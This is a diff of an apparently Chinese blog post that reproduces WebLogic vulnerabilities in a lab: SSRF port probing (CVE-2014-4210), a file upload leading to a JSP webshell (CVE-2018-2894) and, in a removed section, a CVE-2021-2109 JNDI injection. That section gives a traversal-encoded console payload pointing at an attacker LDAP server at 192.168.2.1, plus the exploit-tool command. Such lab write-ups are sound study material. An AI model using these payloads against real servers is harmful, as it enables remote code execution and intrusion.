-</div><p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/682043ec363d2.png" alt="image-20250505175100638" srcset="https://bu.dusays.com/2025/05/11/682043ec363d2.png?size=small, https://bu.dusays.com/2025/05/11/682043ec363d2.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/682043ec363d2.png?size=large 2x" data-title="image-20250505175100638" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
-<h2 id="cve-2014-4210-ssrf" class="heading-element"><span>CVE-2014-4210 SSRF</span>
+</div><p><img loading="lazy" src="https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175618075.png" alt="image-20250505175100638" srcset="https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175618075.png?size=small, https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175618075.png?size=medium 1.5x, https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175618075.png?size=large 2x" data-title="image-20250505175100638" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h3 id="cve-2014-4210-ssrf" class="heading-element"><span>CVE-2014-4210 SSRF</span>
   <a href="#cve-2014-4210-ssrf" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h2><h3 id="影响版本-1" class="heading-element"><span>影响版本</span>
+</h3><h4 id="影响版本-1" class="heading-element"><span>影响版本</span>
   <a href="#%e5%bd%b1%e5%93%8d%e7%89%88%e6%9c%ac-1" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h3><p>Oracle WebLogic Server 10.0.2, 10.3.6</p>
-<h3 id="漏洞复现" class="heading-element"><span>漏洞复现</span>
+</h4><p>Oracle WebLogic Server 10.0.2, 10.3.6</p>
+<h4 id="漏洞复现" class="heading-element"><span>漏洞复现</span>
   <a href="#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h3><p>WebLogic 的 <code>SearchPublicReqistries.jsp</code> 接口存在 SSRF 漏洞，如果服务端或内网存在 Redis 未授权访问漏洞等则可以进一步打漏洞组合拳进行攻击利用。</p>
+</h4><p>WebLogic 的 <code>SearchPublicReqistries.jsp</code> 接口存在 SSRF 漏洞，如果服务端或内网存在 Redis 未授权访问漏洞等则可以进一步打漏洞组合拳进行攻击利用。</p>
 <p><code>SearchPublicReqistries.jsp</code> 在 <code>/wlserver/server/lib/uddiexplorer.war</code> 中</p>
-<p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/6820441427db3.png" alt="image-20250505183040716" srcset="https://bu.dusays.com/2025/05/11/6820441427db3.png?size=small, https://bu.dusays.com/2025/05/11/6820441427db3.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/6820441427db3.png?size=large 2x" data-title="image-20250505183040716" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><img loading="lazy" src="https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175618106.png" alt="image-20250505183040716" srcset="https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175618106.png?size=small, https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175618106.png?size=medium 1.5x, https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175618106.png?size=large 2x" data-title="image-20250505183040716" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p><code>operator</code> 参数就是传进去的 url，然后 <code>search.getResponse()</code> 就会向这个 url 发送请求，而且这个服务没有任何鉴权，可以直接访问，用 payload 探测下 7001 端口</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -420,188 +567,42 @@
 </span></span><span class="line"><span class="cl">weblogic.uddi.client.structures.exception.XML_SoapException: Tried all: &#39;1&#39; addresses, but could not connect over HTTP to server: &#39;127.0.0.1&#39;, port: &#39;7000&#39; </span></span></code></pre></td></tr></table>
 </div>
 </div><p>可以看到 7001 端口只是没找到服务而 7000 端口都不能建立 http 连接，可以通过这个来探测端口</p>
-<h2 id="cve-2018-2894-任意文件上传" class="heading-element"><span>CVE-2018-2894 任意文件上传</span>
+<h3 id="cve-2018-2894-任意文件上传" class="heading-element"><span>CVE-2018-2894 任意文件上传</span>
   <a href="#cve-2018-2894-%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h2><h3 id="影响版本-2" class="heading-element"><span>影响版本</span>
+</h3><h4 id="影响版本-2" class="heading-element"><span>影响版本</span>
   <a href="#%e5%bd%b1%e5%93%8d%e7%89%88%e6%9c%ac-2" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h3><p>Weblogic 10.3.6，12.1.3，12.2.1.2，12.2.1.3</p>
-<h3 id="漏洞复现-1" class="heading-element"><span>漏洞复现</span>
+</h4><p>Weblogic 10.3.6，12.1.3，12.2.1.2，12.2.1.3</p>
+<h4 id="漏洞复现-1" class="heading-element"><span>漏洞复现</span>
   <a href="#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0-1" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h3><p>weblogic如果开启了web服务测试页（默认不开启），则分别会在/ws_utc/begin.do以及/ws_utc/config.do这两个页面存在任意上传getshell漏洞</p>
+</h4><p>weblogic如果开启了web服务测试页（默认不开启），则分别会在/ws_utc/begin.do以及/ws_utc/config.do这两个页面存在任意上传getshell漏洞</p>
 <p>由于该设置默认不开启，所以此漏洞有一定的局限性</p>
-<p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/682043ec95ce2.png" alt="image-20250505225259738" srcset="https://bu.dusays.com/2025/05/11/682043ec95ce2.png?size=small, https://bu.dusays.com/2025/05/11/682043ec95ce2.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/682043ec95ce2.png?size=large 2x" data-title="image-20250505225259738" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><img loading="lazy" src="https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175618140.png" alt="image-20250505225259738" srcset="https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175618140.png?size=small, https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175618140.png?size=medium 1.5x, https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175618140.png?size=large 2x" data-title="image-20250505225259738" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>“高级” 中开启 “启用 Web 服务测试页”，但我这没有这个选项，赛博复现下，挺简单的反正</p>
 <p>访问漏洞页面http://your-ip:7001/ws_utc/config.do（需要手动设置一下环境设置Work Home Dir为，/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css）</p>
-<p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/682043ec57ca4.png" alt="image-20250505225442049" srcset="https://bu.dusays.com/2025/05/11/682043ec57ca4.png?size=small, https://bu.dusays.com/2025/05/11/682043ec57ca4.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/682043ec57ca4.png?size=large 2x" data-title="image-20250505225442049" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><img loading="lazy" src="https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175618168.png" alt="image-20250505225442049" srcset="https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175618168.png?size=small, https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175618168.png?size=medium 1.5x, https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175618168.png?size=large 2x" data-title="image-20250505225442049" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>点击安全 -&gt; 添加，名字和密码可以随意设置，传个 jsp 马</p>
-<p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/682043ec85164.png" alt="image-20250505225448449" srcset="https://bu.dusays.com/2025/05/11/682043ec85164.png?size=small, https://bu.dusays.com/2025/05/11/682043ec85164.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/682043ec85164.png?size=large 2x" data-title="image-20250505225448449" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><img loading="lazy" src="https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175618282.png" alt="image-20250505225448449" srcset="https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175618282.png?size=small, https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175618282.png?size=medium 1.5x, https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175618282.png?size=large 2x" data-title="image-20250505225448449" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>文件上传的路径为http://your-ip:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]，这里的时间戳获取方式有两种，其一为bp抓包查看，其二利用浏览器自带的检查获取，如下所示：</p>
-<p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/682043ec86f0b.png" alt="image-20250505225504857" srcset="https://bu.dusays.com/2025/05/11/682043ec86f0b.png?size=small, https://bu.dusays.com/2025/05/11/682043ec86f0b.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/682043ec86f0b.png?size=large 2x" data-title="image-20250505225504857" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><img loading="lazy" src="https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175618479.png" alt="image-20250505225504857" srcset="https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175618479.png?size=small, https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175618479.png?size=medium 1.5x, https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175618479.png?size=large 2x" data-title="image-20250505225504857" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>然后 rce 即可</p>
-<h3 id="小结" class="heading-element"><span>小结</span>
-  <a href="#%e5%b0%8f%e7%bb%93" class="heading-mark">
-    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
-  </a>
-</h3><p>都挺简单的，感觉限制比较多，不是需要版本低就是要进后台或者开启某些特殊配置，nday是这样的，也算是对 weblogic 有个简单的了解</p>
-<h3 id="参考" class="heading-element"><span>参考</span>
-  <a href="#%e5%8f%82%e8%80%83" class="heading-mark">
-    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
-  </a>
-</h3><p><a href="https://drun1baby.top/2023/03/06/WebLogic-%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-SSRF/"target="_blank" rel="external nofollow noopener noreferrer">https://drun1baby.top/2023/03/06/WebLogic-%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-SSRF/</a></p>
-<p><a href="https://blog.csdn.net/weixin_51198941/article/details/134193310"target="_blank" rel="external nofollow noopener noreferrer">https://blog.csdn.net/weixin_51198941/article/details/134193310</a></p>
-<h2 id="cve-2021-2109-weblogic-jndi-注入" class="heading-element"><span>CVE-2021-2109 WebLogic JNDI 注入</span>
-  <a href="#cve-2021-2109-weblogic-jndi-%e6%b3%a8%e5%85%a5" class="heading-mark">
-    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
-  </a>
-</h2><h3 id="环境搭建" class="heading-element"><span>环境搭建</span>
-  <a href="#%e7%8e%af%e5%a2%83%e6%90%ad%e5%bb%ba" class="heading-mark">
-    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
-  </a>
-</h3><p>参考T3反序列化的环境，需要多加一个 <code>\server\lib\consoleapp\webapp\WEB-INF\lib\console.jar</code> 到依赖中</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">docker run -d -p 7001:7001 -p 8453:8453 -p 5556:5556 --name weblogic1036jdk7u21 weblogic1036jdk7u21</span></span></code></pre></td></tr></table>
-</div>
-</div><h3 id="漏洞分析" class="heading-element"><span>漏洞分析</span>
-  <a href="#%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90" class="heading-mark">
-    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
-  </a>
-</h3><h4 id="利用前提" class="heading-element"><span>利用前提</span>
-  <a href="#%e5%88%a9%e7%94%a8%e5%89%8d%e6%8f%90" class="heading-mark">
-    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
-  </a>
-</h4><p>Oracle WebLogic Server 10.3.6.0.0、12.1.3.0.0、12.2.1.3.0、12.2.1.4.0、14.1.1.0.0</p>
-<p>这里要进入到 /console/consolejndi.portal 路由里才能打</p>
-<h4 id="漏洞分析-1" class="heading-element"><span>漏洞分析</span>
-  <a href="#%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90-1" class="heading-mark">
-    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
-  </a>
-</h4><p>原理就是WebLogic 的 <code>/console/consolejndi.portal</code> 接口可以调用存在 JNDI 注入漏洞的 <code>com.bea.console.handles.JndiBindingHandle</code> 类，从而造成 RCE，所以要在进后台的前提下才能打</p>
-<p>这里用到的工具为：https://github.com/welk1n/JNDI-Injection-Exploit</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &#34;touch /tmp/jndi_test&#34; -A 192.168.2.1</span></span></code></pre></td></tr></table>
-</div>
-</div><p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/6820442bb6338.png" alt="image-20250506171207587" srcset="https://bu.dusays.com/2025/05/11/6820442bb6338.png?size=small, https://bu.dusays.com/2025/05/11/6820442bb6338.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/6820442bb6338.png?size=large 2x" data-title="image-20250506171207587" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
-<p>payload为</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/console/css/%252e%252e%252fconsolejndi.portal?_pageLabel=JNDIBindingPageGeneral&amp;_nfpb=true&amp;JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://192.168.2;1:1389/mezyww;AdminServer%22)</span></span></code></pre></td></tr></table>
-</div>
